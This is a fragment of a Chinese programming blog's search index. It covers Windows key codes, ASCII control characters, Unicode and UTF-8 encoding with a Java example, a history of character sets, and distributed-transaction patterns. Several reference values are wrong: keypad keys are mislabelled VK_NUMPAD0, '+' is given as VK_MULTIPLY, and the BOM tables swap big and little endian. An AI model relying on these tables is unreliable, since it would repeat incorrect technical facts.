<td>115</td>
</tr>
<tr>
<td>F5键</td>
<td>VK_F5</td>
<td>116</td>
</tr>
<tr>
<td>F6键</td>
<td>VK_F6</td>
<td>117</td>
</tr>
<tr>
<td>F7键</td>
<td>VK_F7</td>
<td>118</td>
</tr>
<tr>
<td>F8键</td>
<td>VK_F8</td>
<td>119</td>
</tr>
<tr>
<td>F9键</td>
<td>VK_F9</td>
<td>120</td>
</tr>
<tr>
<td>F10键</td>
<td>VK_F10</td>
<td>121</td>
</tr>
<tr>
<td>F11键</td>
<td>VK_F11</td>
<td>122</td>
</tr>
<tr>
<td>F12键</td>
<td>VK_F12</td>
<td>123</td>
</tr>
<tr>
<td>Num Lock键</td>
<td>VK_NUMLOCK</td>
<td>144</td>
</tr>
<tr>
<td>小键盘0</td>
<td>VK_NUMPAD0</td>
<td>96</td>
</tr>
<tr>
<td>小键盘1</td>
<td>VK_NUMPAD0</td>
<td>97</td>
</tr>
<tr>
<td>小键盘2</td>
<td>VK_NUMPAD0</td>
<td>98</td>
</tr>
<tr>
<td>小键盘3</td>
<td>VK_NUMPAD0</td>
<td>99</td>
</tr>
<tr>
<td>小键盘4</td>
<td>VK_NUMPAD0</td>
<td>100</td>
</tr>
<tr>
<td>小键盘5</td>
<td>VK_NUMPAD0</td>
<td>101</td>
</tr>
<tr>
<td>小键盘6</td>
<td>VK_NUMPAD0</td>
<td>102</td>
</tr>
<tr>
<td>小键盘7</td>
<td>VK_NUMPAD0</td>
<td>103</td>
</tr>
<tr>
<td>小键盘8</td>
<td>VK_NUMPAD0</td>
<td>104</td>
</tr>
<tr>
<td>小键盘9</td>
<td>VK_NUMPAD0</td>
<td>105</td>
</tr>
<tr>
<td>小键盘.</td>
<td>VK_DECIMAL</td>
<td>110</td>
</tr>
<tr>
<td>小键盘*</td>
<td>VK_MULTIPLY</td>
<td>106</td>
</tr>
<tr>
<td>小键盘+</td>
<td>VK_MULTIPLY</td>
<td>107</td>
</tr>
<tr>
<td>小键盘-</td>
<td>VK_SUBTRACT</td>
<td>109</td>
</tr>
<tr>
<td>小键盘&#x2F;</td>
<td>VK_DIVIDE</td>
<td>111</td>
</tr>
<tr>
<td>Pause Break键</td>
<td>VK_PAUSE</td>
<td>19</td>
</tr>
<tr>
<td>Scroll Lock键</td>
<td>VK_SCROLL</td>
<td>145</td>
</tr>
</tbody></table>
<h2 id="ASCII码表-控制字符功能表"><a href="#ASCII码表-控制字符功能表" class="headerlink" title="ASCII码表:控制字符功能表"></a>ASCII码表:控制字符功能表</h2><table>
<thead>
<tr>
<th>英</th>
<th>中</th>
<th>英</th>
<th>中</th>
<th>英</th>
<th>中</th>
</tr>
</thead>
<tbody><tr>
<td>NUL</td>
<td>空字符</td>
<td>VT</td>
<td>垂直制表符</td>
<td>SYN</td>
<td>同步空闲</td>
</tr>
<tr>
<td>SOH</td>
<td>标题开始</td>
<td>FF</td>
<td>换页键</td>
<td>ETB</td>
<td>传输块结束</td>
</tr>
<tr>
<td>STX</td>
<td>正文开始</td>
<td>CR</td>
<td>回车键</td>
<td>CAN</td>
<td>取消</td>
</tr>
<tr>
<td>ETX</td>
<td>正文结束</td>
<td>SO</td>
<td>不用切换</td>
<td>EM</td>
<td>介质中断</td>
</tr>
<tr>
<td>EOY</td>
<td>传输结束</td>
<td>SI</td>
<td>启用切换</td>
<td>SUB</td>
<td>替补</td>
</tr>
<tr>
<td>ENQ</td>
<td>请求</td>
<td>DLE</td>
<td>数据链路转义</td>
<td>ESC</td>
<td>溢出</td>
</tr>
<tr>
<td>ACK</td>
<td>收到通知</td>
<td>DC1</td>
<td>设备控制1</td>
<td>FS</td>
<td>文件分割符</td>
</tr>
<tr>
<td>BEL</td>
<td>响铃</td>
<td>DC2</td>
<td>设备控制2</td>
<td>GS</td>
<td>分组符</td>
</tr>
<tr>
<td>BS</td>
<td>退格</td>
<td>DC3</td>
<td>设备控制3</td>
<td>RS</td>
<td>记录分隔符</td>
</tr>
<tr>
<td>HT</td>
<td>水平制表符</td>
<td>DC4</td>
<td>设备控制4</td>
<td>US</td>
<td>单元分隔符</td>
</tr>
<tr>
<td>LF</td>
<td>换行建</td>
<td>NAK</td>
<td>拒接接收</td>
<td>DEL</td>
<td>删除</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>基础</category>
        <category>字符集</category>
      </categories>
      <tags>
        <tag>字符集</tag>
        <tag>ASCII码</tag>
      </tags>
  </entry>
  <entry>
    <title>Unicode和UTF-8编码示例</title>
    <url>/blog/basetech/charset/ucsutf8demo/</url>
    <content><![CDATA[<p>举一个例子：It&#39;s 知乎日报你看到的unicode字符集是这样的编码表：</p>
<pre><code>I 0049
t 0074
&#39; 0027
s 0073
  0020
知 77e5
乎 4e4e
日 65e5
报 62a5
</code></pre>
<p>每一个字符对应一个十六进制数字。计算机只懂二进制，因此，严格按照unicode的方式(UCS-2)，应该这样存储：</p>
<pre><code>I 00000000 01001001
t 00000000 01110100
&#39; 00000000 00100111
s 00000000 01110011
  00000000 00100000
知 01110111 11100101
乎 01001110 01001110
日 01100101 11100101
报 01100010 10100101
</code></pre>
<p>这个字符串总共占用了18个字节，但是对比中英文的二进制码，可以发现，英文前9位都是0！浪费啊，浪费硬盘，浪费流量。怎么办？</p>
<p>UTF-8是这样做的：</p>
<ol>
<li><p>单字节的字符，字节的第一位设为0，对于英语文本，UTF-8码只占用一个字节，和ASCII码完全相同；</p>
</li>
<li><p>n个字节的字符(n&gt;1)，第一个字节的前n位设为1，第n+1位设为0，后面字节的前两位都设为10，这n个字节的其余空位填充该字符unicode码，高位用0补足。</p>
</li>
</ol>
<p>这样就形成了如下的UTF-8标记位：</p>
<pre><code>0xxxxxxx
110xxxxx 10xxxxxx
1110xxxx 10xxxxxx 10xxxxxx
11110xxx 10xxxxxx 10xxxxxx 10xxxxxx
111110xx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx
1111110x 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx
... ...
</code></pre>
<p>于是，”It&#39;s 知乎日报”就变成了：</p>
<pre><code>I 01001001
t 01110100
&#39; 00100111
s 01110011
  00100000
知 11100111 10011111 10100101
乎 11100100 10111001 10001110
日 11100110 10010111 10100101
报 11100110 10001010 10100101
</code></pre>
<p>和上边的方案对比一下，英文短了，每个中文字符却多用了一个字节。但是整个字符串只用了17个字节，比上边的18个短了一点点。</p>
<p>转自：<a href="http://www.zhihu.com/question/23374078">http://www.zhihu.com/question/23374078</a></p>
]]></content>
      <categories>
        <category>基础</category>
        <category>字符集</category>
      </categories>
      <tags>
        <tag>字符集</tag>
      </tags>
  </entry>
  <entry>
    <title>用JAVA输出UTF-8编码的二进制码</title>
    <url>/blog/basetech/charset/outbinarycharset/</url>
    <content><![CDATA[<pre><code>import java.io.UnsupportedEncodingException;


/**
 * Test
 * @author douzh
 * @version 1.0
 *
 */
public class Test &#123;
    public static void main(String[] args) throws UnsupportedEncodingException &#123;
        byte[] bs=&quot;报&quot;.getBytes(&quot;utf8&quot;);
        System.out.print(&quot;utf-8:&quot;);
        for(int i=0;i&lt;bs.length;i++)&#123;
            System.out.print(byte2binary(bs[i])+&quot; &quot;);
        &#125;
        bs=&quot;报&quot;.getBytes(&quot;utf16&quot;);
        System.out.print(&quot;\nutf16:&quot;);
        for(int i=0;i&lt;bs.length;i++)&#123;
            System.out.print(byte2binary(bs[i])+&quot; &quot;);
        &#125;
        bs=&quot;报&quot;.getBytes(&quot;utf32&quot;);
        System.out.print(&quot;\nutf32:&quot;);
        for(int i=0;i&lt;bs.length;i++)&#123;
            System.out.print(byte2binary(bs[i])+&quot; &quot;);
        &#125;
    &#125;
    
    /**
     *  返回一个字节的二进制串
     */
    public static String byte2binary(byte bt) &#123;
        int n=bt;
        StringBuilder str = new StringBuilder();
        for (int i=0; i &lt; 8;i++) &#123;
            str.append(Math.abs(n % 2));
            n = n &gt;&gt; 1;
        &#125;
        return str.reverse().toString();
    &#125;
&#125;
</code></pre>
<p>输出结果：</p>
<pre><code>utf-8:11100110 10001010 10100101 
utf16:11111110 11111111 01100010 10100101 
utf32:00000000 00000000 01100010 10100101 
</code></pre>
<p>utf16结果好奇怪，多了两个字符。这其实是文件的BOM。</p>
<p>当一个软件打开一个文本时，它要做的第一件事是决定这个文本究竟是使用哪种字符集的哪种编码保存的。软件一般采用三种方式来决定文本的字符集和编码：<br>检测文件头标识，提示用户选择，根据一定的规则猜测<br>最标准的途径是检测文本最开头的几个字节，开头字节<br>Charset&#x2F;encoding,如下表：</p>
<pre><code>EF BB BF UTF-8 
FE FF UTF-16/UCS-2, little endian 
FF FE UTF-16/UCS-2, big endian 
FF FE 00 00 UTF-32/UCS-4, little endian. 
00 00 FE FF UTF-32/UCS-4, big-endian.
</code></pre>
<p>这两个字节只输出一次，为了说明这一点，我们输出下面的内容：</p>
<pre><code>bs=&quot;报报&quot;.getBytes(&quot;utf16&quot;);
</code></pre>
<p>输出结果：</p>
<pre><code>utf16:11111110 11111111 01100010 10100101 01100010 10100101 
</code></pre>
<p>看，是不是只输出了一次。JAVA还是很智能的。</p>
]]></content>
      <categories>
        <category>基础</category>
        <category>字符集</category>
      </categories>
      <tags>
        <tag>字符集</tag>
      </tags>
  </entry>
  <entry>
    <title>字符编码的故事</title>
    <url>/blog/basetech/charset/story/</url>
    <content><![CDATA[<p>很久很久以前，有一群人，他们决定用8个可以开合的晶体管来组合成不同的状态，以表示世界上的万物。他们看到8个开关状态是好的，于是他们把这称为&quot;字节&quot;。</p>
<p>再后来，他们又做了一些可以处理这些字节的机器，机器开动了，可以用字节来组合出很多状态，状态开始变来变去。他们看到这样是好的，于是它们就这机器称为&quot;计算机&quot;。</p>
<p>他们把其中的编号从0开始的32种状态分别规定了特殊的用途，一但终端、打印机遇上约定好的这些字节被传过来时，就要做一些约定的动作。遇上00x10,<br>终端就换行，遇上0x07, 终端就向人们嘟嘟叫，例好遇上0x1b,<br>打印机就打印反白的字，或者终端就用彩色显示字母。他们看到这样很好，于是就把这些0x20以下的字节状态称为&quot;控制码&quot;。</p>
<p>他们又把所有的空格、标点符号、数字、大小写字母分别用连续的字节状态表示，一直编到了第127号，这样计算机就可以用不同字节来存储英语的文字了。大家看到这样，都感觉很好，于是大家都把这个方案叫做<br>ANSI 的&quot;Ascii&quot;编码（American Standard Code for Information<br>Interchange，美国信息互换标准代码）。当时世界上所有的计算机都用同样的ASCII方案来保存英文文字。</p>
<p>后来，就像建造巴比伦塔一样，世界各地的都开始使用计算机，但是很多国家用的不是英文，他们的字母里有许多是ASCII里没有的，为了可以在计算机保存他们的文字，他们决定采用127号之后的空位来表示这些新的字母、符号，还加入了很多画表格时需要用下到的横线、竖线、交叉等形状，一直把序号编到了最后一个状态255。从128到255这一页的字符集被称&quot;扩展字符集&quot;。从此之后，贪婪的人类再没有新的状态可以用了，美帝国主义可能没有想到还有第三世界国家的人们也希望可以用到计算机吧！</p>
<p>等中国人们得到计算机时，已经没有可以利用的字节状态来表示汉字，况且有6000多个常用汉字需要保存呢。但是这难不倒智慧的中国人民，我们不客气地把那些127号之后的奇异符号们直接取消掉,<br>规定：一个小于127的字符的意义与原来相同，但两个大于127的字符连在一起时，就表示一个汉字，前面的一个字节（他称之为高字节）从0xA1用到0xF7，后面一个字节（低字节）从0xA1到0xFE，这样我们就可以组合出大约7000多个简体汉字了。在这些编码里，我们还把数学符号、罗马希腊的字母、日文的假名们都编进去了，连在<br>ASCII<br>里本来就有的数字、标点、字母都统统重新编了两个字节长的编码，这就是常说的&quot;全角&quot;字符，而原来在127号以下的那些就叫&quot;半角&quot;字符了。</p>
<p>中国人民看到这样很不错，于是就把这种汉字方案叫做 &quot;GB2312&quot;。GB2312 是对<br>ASCII 的中文扩展。</p>
<p>但是中国的汉字太多了，我们很快就就发现有许多人的人名没有办法在这里打出来，特别是某些很会麻烦别人的国家领导人。于是我们不得不继续把<br>GB2312 没有用到的码位找出来老实不客气地用上。</p>
<p>后来还是不够用，于是干脆不再要求低字节一定是127号之后的内码，只要第一个字节是大于127就固定表示这是一个汉字的开始，不管后面跟的是不是扩展字符集里的内容。结果扩展之后的编码方案被称为<br>GBK 标准，GBK 包括了 GB2312<br>的所有内容，同时又增加了近20000个新的汉字（包括繁体字）和符号。</p>
<p>后来少数民族也要用电脑了，于是我们再扩展，又加了几千个新的少数民族的字，GBK<br>扩成了 GB18030。从此之后，中华民族的文化就可以在计算机时代中传承了。</p>
<p>中国的程序员们看到这一系列汉字编码的标准是好的，于是通称他们叫做<br>&quot;DBCS&quot;（Double Byte Charecter Set<br>双字节字符集）。在DBCS系列标准里，最大的特点是两字节长的汉字字符和一字节长的英文字符并存于同一套编码方案里，因此他们写的程序为了支持中文处理，必须要注意字串里的每一个字节的值，如果这个值是大于127的，那么就认为一个双字节字符集里的字符出现了。那时候凡是受过加持，会编程的计算机僧侣们都要每天念下面这个咒语数百遍：</p>
<p>&quot;一个汉字算两个英文字符！一个汉字算两个英文字符……&quot;</p>
<p>因为当时各个国家都像中国这样搞出一套自己的编码标准，结果互相之间谁也不懂谁的编码，谁也不支持别人的编码，连大陆和台湾这样只相隔了150海里，使用着同一种语言的兄弟地区，也分别采用了不同的<br>DBCS<br>编码方案——当时的中国人想让电脑显示汉字，就必须装上一个&quot;汉字系统&quot;，专门用来处理汉字的显示、输入的问题，但是那个台湾的愚昧封建人士写的算命程序就必须加装另一套支持<br>BIG5<br>编码的什么&quot;倚天汉字系统&quot;才可以用，装错了字符系统，显示就会乱了套！这怎么办？而且世界民族之林中还有那些一时用不上电脑的穷苦人民，他们的文字又怎么办？</p>
<p>真是计算机的巴比伦塔命题啊！</p>
<p>正在这时，大天使加百列及时出现了——一个叫 ISO<br>（国际标谁化组织）的国际组织决定着手解决这个问题。他们采用的方法很简单：废了所有的地区性编码方案，重新搞一个包括了地球上所有文化、所有字母和符号的编码！他们打算叫它&quot;Universal<br>Multiple-Octet Coded Character Set&quot;，简称 UCS, 俗称 &quot;UNICODE&quot;。</p>
<p>UNICODE<br>开始制订时，计算机的存储器容量极大地发展了，空间再也不成为问题了。于是<br>ISO<br>就直接规定必须用两个字节，也就是16位来统一表示所有的字符，对于ascii里的那些”半角”字符，UNICODE<br>包持其原编码不变，只是将其长度由原来的8位扩展为16位，而其他文化和语言的字符则全部重新统一编码。由于&quot;半角&quot;英文符号只需要用到低8位，所以其高8位永远是0，因此这种大气的方案在保存英文文本时会多浪费一倍的空间。</p>
<p>这时候，从旧社会里走过来的程序员开始发现一个奇怪的现象：他们的strlen函数靠不住了，一个汉字不再是相当于两个字符了，而是一个！是的，从<br>UNICODE<br>开始，无论是半角的英文字母，还是全角的汉字，它们都是统一的&quot;一个字符&quot;！同时，也都是统一的&quot;两个字节&quot;，请注意&quot;字符&quot;和&quot;字节&quot;两个术语的不同，”字节”是一个8位的物理存贮单元，而”字符”则是一个文化相关的符号。在UNICODE<br>中，一个字符就是两个字节。一个汉字算两个英文字符的时代已经快过去了。</p>
<p>从前多种字符集存在时，那些做多语言软件的公司遇上过很大麻烦，他们为了在不同的国家销售同一套软件，就不得不在区域化软件时也加持那个双字节字符集咒语，不仅要处处小心不要搞错，还要把软件中的文字在不同的字符集中转来转去。UNICODE<br>对于他们来说是一个很好的一揽子解决方案，于是从 Windows NT 开始，MS<br>趁机把它们的操作系统改了一遍，把所有的核心代码都改成了用 UNICODE<br>方式工作的版本，从这时开始，WINDOWS<br>系统终于无需要加装各种本土语言系统，就可以显示全世界上所有文化的字符了。</p>
<p>但是，UNICODE 在制订时没有考虑与任何一种现有的编码方案保持兼容，这使得<br>GBK 与UNICODE<br>在汉字的内码编排上完全是不一样的，没有一种简单的算术方法可以把文本内容从UNICODE编码和另一种编码进行转换，这种转换必须通过查表来进行。</p>
<p>如前所述，UNICODE<br>是用两个字节来表示为一个字符，他总共可以组合出65535不同的字符，这大概已经可以覆盖世界上所有文化的符号。如果还不够也没有关系，ISO已经准备了UCS-4方案，说简单了就是四个字节来表示一个字符，这样我们就可以组合出21亿个不同的字符出来（最高位有其他用途），这大概可以用到银河联邦成立那一天吧！</p>
<p>UNICODE 来到时，一起到来的还有计算机网络的兴起，UNICODE<br>如何在网络上传输也是一个必须考虑的问题，于是面向传输的众多 UTF（UCS<br>Transfer<br>Format）标准出现了，顾名思义，UTF8就是每次8个位传输数据，而UTF16就是每次16个位，只不过为了传输时的可靠性，从UNICODE到UTF时并不是直接的对应，而是要过一些算法和规则来转换。</p>
<p>受到过网络编程加持的计算机僧侣们都知道，在网络里传递信息时有一个很重要的问题，就是对于数据高低位的解读方式，一些计算机是采用低位先发送的方法，例如我们PC机采用的<br>INTEL<br>架构，而另一些是采用高位先发送的方式，在网络中交换数据时，为了核对双方对于高低位的认识是否是一致的，采用了一种很简便的方法，就是在文本流的开始时向对方发送一个标志符——如果之后的文本是高位在位，那就发送&quot;FEFF&quot;，反之，则发送&quot;FFFE&quot;。不信你可以用二进制方式打开一个UTF-X格式的文件，看看开头两个字节是不是这两个字节？</p>
]]></content>
      <categories>
        <category>基础</category>
        <category>字符集</category>
      </categories>
      <tags>
        <tag>字符集</tag>
      </tags>
  </entry>
  <entry>
    <title>UTF-8编码详解</title>
    <url>/blog/basetech/charset/utf8/</url>
    <content><![CDATA[<h2 id="UTF-X是什么意思"><a href="#UTF-X是什么意思" class="headerlink" title="UTF-X是什么意思"></a>UTF-X是什么意思</h2><p>UNICODE字符由2个字节表示，可以用ASCII表示的字符使用UNICODE并不高效，因为UNICODE比ASCII占用大一倍的空间，而对ASCII来说高字节的0对他毫无用处。为了解决这个问题，就出现了一些中间格式的字符集，他们被称为通用转换格式，即UTF（Universal Transformation Format）。常见的UTF格式有：UTF-7, UTF-7.5, UTF-8,UTF-16,以及 UTF-32。</p>
<p>所以UTF-8不是一个字符集，一个字符集包括字符的集合和每个字符的编码，但UTF-8只是对UNICODE字符集的一种转换格式。</p>
<p>理论上UTF可以对任何字符集做转换，如GB系列字符集。只不过一般我们用的UTF-8是对UNICODE做的转换。</p>
<h2 id="UTF的转换方式"><a href="#UTF的转换方式" class="headerlink" title="UTF的转换方式"></a>UTF的转换方式</h2><p>以UTF-8编码UCS-2为例：</p>
<pre><code>Unicode      |   UTF-8 
0000 - 007F  |   0xxxxxxx 
0080 - 07FF  |   110xxxxx 10xxxxxx 
0800 - FFFF  |   1110xxxx 10xxxxxx 10xxxxxx 
</code></pre>
<p>1.单字节的字符，字节的第一位设为0，对于英语文本，UTF-8码只占用一个字节，和ASCII码完全相同；</p>
<p>2.n个字节的字符(n&gt;1)，第一个字节的前n位设为1，第n+1位设为0，后面字节的前两位都设为10，这n个字节的其余空位填充该字符unicode码，高位用0补足。</p>
<p>通用的编码后的格式：</p>
<pre><code>0xxxxxxx
110xxxxx 10xxxxxx
1110xxxx 10xxxxxx 10xxxxxx
11110xxx 10xxxxxx 10xxxxxx 10xxxxxx
111110xx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx
1111110x 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx
... ...
</code></pre>
<p>如果UNICODE字符由2个字节表示，则编码成UTF-8很可能需要3个字节。而如果UNICODE字符由4个字节表示，则编码成UTF-8可能需要6个字节。用4个或6个字节去编码一个UNICODE字符可能太多了，但很少会遇到那样的UNICODE字符。</p>
<h2 id="UTF格式文件的BOM"><a href="#UTF格式文件的BOM" class="headerlink" title="UTF格式文件的BOM"></a>UTF格式文件的BOM</h2><p>当一个软件打开一个文本时，它要做的第一件事是决定这个文本究竟是使用哪种字符集的哪种编码保存的。软件一般采用三种方式来决定文本的字符集和编码：</p>
<p>检测文件头标识，提示用户选择，根据一定的规则猜测</p>
<p>最标准的途径是检测文本最开头的几个字节，UTF格式文件开头字节<br>Charset&#x2F;encoding,如下表：</p>
<pre><code>EF BB BF UTF-8 
FE FF UTF-16/UCS-2, little endian 
FF FE UTF-16/UCS-2, big endian 
FF FE 00 00 UTF-32/UCS-4, little endian. 
00 00 FE FF UTF-32/UCS-4, big-endian.
</code></pre>
<h2 id="UTF格式的”联通”问题"><a href="#UTF格式的”联通”问题" class="headerlink" title="UTF格式的”联通”问题"></a>UTF格式的”联通”问题</h2><p>一个很著名的奇怪现象：当你在 windows的记事本里新建一个文件，输入&quot;联通&quot;两个字之后，保存，关闭，然后再次打开，你会发现这两个字已经消失了，代之的是几个乱码！呵呵，有人说这就是联通之所以拼不过移动的原因。</p>
<p>其实这是因为GB2312编码与UTF8编码产生了编码冲撞的原因。</p>
<p>GB系中”联通”的二进制编码为：</p>
<pre><code>11000001 10101010 11001101 10101000
</code></pre>
<p>注意到了吗？第一二个字节、第三四个字节的起始部分的都是&quot;110&quot;和&quot;10&quot;，正好与UTF8规则里的两字节模板是一致的，于是再次打开记事本时，记事本就误认为这是一个UTF8编码的文件，让我们把第一个字节的110和第二个字节的10去掉，我们就得到了&quot;00001 101010&quot;，再把各位对齐，补上前导的0，就得到了&quot;0000 0000 0110 1010&quot;，不好意思，这是UNICODE的006A，也就是小写的字母&quot;j&quot;，而之后的两字节用UTF8解码之后是0368，这个字符什么也不是。这就是只有&quot;联通&quot;两个字的文件没有办法在记事本里正常显示的原因。</p>
<p>而如果你在&quot;联通&quot;之后多输入几个字，其他的字的编码不见得又恰好是110和10开始的字节，这样再次打开时，记事本就不会坚持这是一个utf8编码的文件，而会用ANSI的方式解读之，这时乱码又不出现了。</p>
]]></content>
      <categories>
        <category>基础</category>
        <category>字符集</category>
      </categories>
      <tags>
        <tag>字符集</tag>
      </tags>
  </entry>
  <entry>
    <title>【CAP】(转)分布式事务最佳实践方案汇总</title>
    <url>/blog/arch/cap/allplan/</url>
    <content><![CDATA[<p>说到分布式事务，就会谈到那个经典的”账号转账”问题：2个账号，分布处于2个不同的DB，对应2个不同的系统A,B。A要扣钱，B要加钱，如何保证原子性？</p>
<h2 id="传统方案-–-2PC"><a href="#传统方案-–-2PC" class="headerlink" title="传统方案 – 2PC"></a>传统方案 – 2PC</h2><p>（1）2PC的理论层面：</p>
<p>2pc涉及到2个阶段，3个操作：</p>
<p>阶段1：“准备提交”。事务协调者向所有参与者发起prepare，所有参与者回答yes&#x2F;no。</p>
<p>阶段2：“正式提交”。如果所有参与者都回答yes，则向所有参与者发起commit；否则，向所有参与者发起rollback。</p>
<p>因此，要实现2pc，所有参与者，都得实现3个接口：prepare&#x2F;commit&#x2F;rollback。</p>
<p>（2）2PC的实现层面</p>
<p>对应的实现层面，也就是XA协议，通常的数据库都实现了这个协议。</p>
<p>有一个Atomikos开源库，提供了2PC的实现方案。有兴趣的可以去看一下如何使用。</p>
<p>（3）2PC的问题</p>
<p>问题1：阶段2，事务协调者挂了，则所有参与者接受不到commit&#x2F;rollback指令，将处于“悬而不决”状态</p>
<p>问题2：阶段2，其中一个参与者超时或者出错，那其他参与者，是commit，还是rollback呢？ 也不能确定</p>
<p>为了解决2pc的问题，又引入3pc。3pc有类似的挂了如何解决的问题，因此还是没能彻底解决问题，此处就不详述了。</p>
<p>问题3：2PC的实现，目前主要是用在数据库层面（数据库实现了XA协议）。但目前，大家基本都是微服务架构，不会直接在2个业务DB之间搞一致性，而是想如何在2个服务上面实现一致性。</p>
<p>正因为2PC有上面诸多问题和不便，实践中一般很少使用，而是采用下面将要讲的各种方案。</p>
<h2 id="最终一致性"><a href="#最终一致性" class="headerlink" title="最终一致性"></a>最终一致性</h2><p>一般的思路都是通过消息中间件来实现“最终一致性”：A系统扣钱，然后发条消息给中间件，B系统接收此消息，进行加钱。</p>
<p>但这里面有个问题：A是先update DB，后发送消息呢？ 还是先发送消息，后update DB？</p>
<p>假设先update DB成功，发送消息网络失败，重发又失败，怎么办？</p>
<p>假设先发送消息成功，update DB失败。消息已经发出去了，又不能撤回，怎么办？</p>
<p>所以，这里下个结论： 只要发送消息和update DB这2个操作不是原子的，无论谁先谁后，都是有问题的。</p>
<p>那这个问题怎么解决呢？？</p>
<h2 id="错误的方案"><a href="#错误的方案" class="headerlink" title="错误的方案"></a>错误的方案</h2><p>有人可能想到了，我可以把“发送消息”这个网络调用和update DB放在同1个事务里面，如果发送消息失败，update DB自动回滚。这样不就保证2个操作的原子性了吗？</p>
<p>这个方案看似正确，其实是错误的，原因有2：</p>
<p>（1）网络的2将军问题：发送消息失败，发送方并不知道是消息中间件真的没有收到消息呢？还是消息已经收到了，只是返回response的时候失败了？</p>
<p>如果是已经收到消息了，而发送端认为没有收到，执行update db的回滚操作。则会导致A账号的钱没有扣，B账号的钱却加了。</p>
<p>（2）把网络调用放在DB事务里面，可能会因为网络的延时，导致DB长事务。严重的，会block整个DB。这个风险很大。</p>
<p>基于以上分析，我们知道，这个方案其实是错误的！</p>
<h2 id="方案1-–-最终一致性（业务方自己实现）"><a href="#方案1-–-最终一致性（业务方自己实现）" class="headerlink" title="方案1 – 最终一致性（业务方自己实现）"></a>方案1 – 最终一致性（业务方自己实现）</h2><p>假设消息中间件没有提供“事务消息”功能，比如你用的是Kafka。那如何解决这个问题呢？</p>
<p>解决方案如下：</p>
<p>（1）Producer端准备1张消息表，把update DB和insert message这2个操作，放在一个DB事务里面。</p>
<p>（2）准备一个后台程序，源源不断的把消息表中的message传送给消息中间件。失败了，不断重试重传。允许消息重复，但消息不会丢，顺序也不会打乱。</p>
<p>（3）Consumer端准备一个判重表。处理过的消息，记在判重表里面。实现业务的幂等。但这里又涉及一个原子性问题：如何保证消息消费 + insert message到判重表这2个操作的原子性？</p>
<p>消费成功，但insert判重表失败，怎么办？关于这个，在Kafka的源码分析系列，第1篇， exactly once问题的时候，有过讨论。</p>
<p>通过上面3步，我们基本就解决了这里update db和发送网络消息这2个操作的原子性问题。</p>
<p>但这个方案的一个缺点就是：需要设计DB消息表，同时还需要一个后台任务，不断扫描本地消息。导致消息的处理和业务逻辑耦合额外增加业务方的负担。</p>
<h2 id="方案2-–-最终一致性（RocketMQ-事务消息）"><a href="#方案2-–-最终一致性（RocketMQ-事务消息）" class="headerlink" title="方案2  – 最终一致性（RocketMQ 事务消息）"></a>方案2  – 最终一致性（RocketMQ 事务消息）</h2><p>为了能解决该问题，同时又不和业务耦合，RocketMQ提出了“事务消息”的概念。</p>
<p>具体来说，就是把消息的发送分成了2个阶段：Prepare阶段和确认阶段。</p>
<p>具体来说，上面的2个步骤，被分解成3个步骤：</p>
<p>(1) 发送Prepared消息</p>
<p>(2) update DB</p>
<p>(3) 根据update DB结果成功或失败，Confirm或者取消Prepared消息。</p>
<p>可能有人会问了，前2步执行成功了，最后1步失败了怎么办？这里就涉及到了RocketMQ的关键点：RocketMQ会定期（默认是1分钟）扫描所有的Prepared消息，询问发送方，到底是要确认这条消息发出去？还是取消此条消息？</p>
<p>总结：对比方案2和方案1，RocketMQ最大的改变，其实就是把“扫描消息表”这个事情，不让业务方做，而是消息中间件帮着做了。</p>
<p>至于消息表，其实还是没有省掉。因为消息中间件要询问发送方，事物是否执行成功，还是需要一个“变相的本地消息表”，记录事物执行状态。</p>
<h2 id="人工介入"><a href="#人工介入" class="headerlink" title="人工介入"></a>人工介入</h2><p>可能有人又要说了，无论方案1，还是方案2，发送端把消息成功放入了队列，但消费端消费失败怎么办？</p>
<p>消费失败了，重试，还一直失败怎么办？是不是要自动回滚整个流程？</p>
<p>答案是人工介入。从工程实践角度讲，这种整个流程自动回滚的代价是非常巨大的，不但实现复杂，还会引入新的问题。比如自动回滚失败，又怎么处理？</p>
<p>对应这种极低概率的case，采取人工处理，会比实现一个高复杂的自动化回滚系统，更加可靠，也更加简单。</p>
<h2 id="方案3：TCC"><a href="#方案3：TCC" class="headerlink" title="方案3：TCC"></a>方案3：TCC</h2><p>为了解决SOA系统中的分布式事务问题，支付宝提出了TCC。2PC通常都是在跨库的DB层面，而TCC本质就是一个应用层面的2PC。</p>
<p>同样，TCC中，每个参与者需要3个操作：Try&#x2F;Confirm&#x2F;Cancel，也是2个阶段。 </p>
<p>阶段1：”资源预留&#x2F;资源检查“，也就是事务协调者调用所有参与者的Try操作 </p>
<p>阶段2：“一起提交”。如果所有的Try成功，一起执行Confirm。否则，所有的执行Cancel.</p>
<p>TCC是如何解决2PC的问题呢？</p>
<p>关键：Try阶段成功之后，Confirm如果失败(不管是协调者挂了，还是某个参与者超时），不断重试！！</p>
<p>同样，Cancel失败了，也是不断重试。这就要求Confirm&#x2F;Cancel都必须是幂等操作。</p>
<p>下面以1个转账case为例，来说明TCC的过程： </p>
<p>有3个账号A, B, C，通过SOA提供的转账服务操作。A, B同时分别要向C转30, 50元，最后C的账号+80，A, B各减30, 50。</p>
<p>阶段1：A账号锁定30，B账号锁定50，检查C账号的合法性（比如C账号是否违法被冻结，C账号是否已注销。。。）。</p>
<p>所以，对应的“扣钱”的Try操作就是”锁定”，对应的“加钱”的Try操作就是检查账号合法性</p>
<p>阶段2：A, B, C都Try成功，执行Confirm。即A, B减钱，C加钱。如果任意一个失败，不断重试！</p>
<p>从上面的案例可以看出，Try操作主要是为了“保证业务操作的前置条件都得到满足”，然后在Confirm阶段，因为前置条件都满足了，所以可以不断重试保证成功。</p>
<h2 id="方案4：事务状态表-调用方重试-接收方幂等-（同步-异步）"><a href="#方案4：事务状态表-调用方重试-接收方幂等-（同步-异步）" class="headerlink" title="方案4：事务状态表 + 调用方重试 + 接收方幂等 （同步 + 异步）"></a>方案4：事务状态表 + 调用方重试 + 接收方幂等 （同步 + 异步）</h2><p>同样以上面的转账为例：调用方调系统A扣钱，系统B加钱，如何保证2个同时成功？</p>
<p>调用方维护1张事务状态表（或者说事务日志，日志流水），每次调用之前，落盘1条事务流水，生成1个全局的事务ID。</p>
<p>初始状态是Init，每调用成功1个系统更新1次状态（这里就2个系统），最后所有系统调用成功，状态更新为Success。</p>
